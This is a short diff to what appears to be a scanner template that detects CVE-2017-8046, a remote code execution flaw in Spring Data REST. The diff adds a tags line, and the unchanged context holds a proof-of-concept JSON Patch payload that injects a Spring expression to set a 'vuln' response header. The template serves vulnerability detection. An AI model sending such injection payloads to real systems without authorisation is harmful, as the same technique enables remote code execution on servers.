@@ -3,6 +3,7 @@ metadata:
     name: "CVE-2017-8046 Spring Data Rest RCE"
     description: "Spring Data Rest RCE (CVE-2017-8046)"
     author: "timeshatter"
+    tags: "Spring Data Rest RCE","CVE-2017-8046"
 
 define:
     poc="[{ \"op\": \"replace\", \"path\": \"{T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader('vuln', 'True')}/aa\", \"value\": \"aaa\" }]"
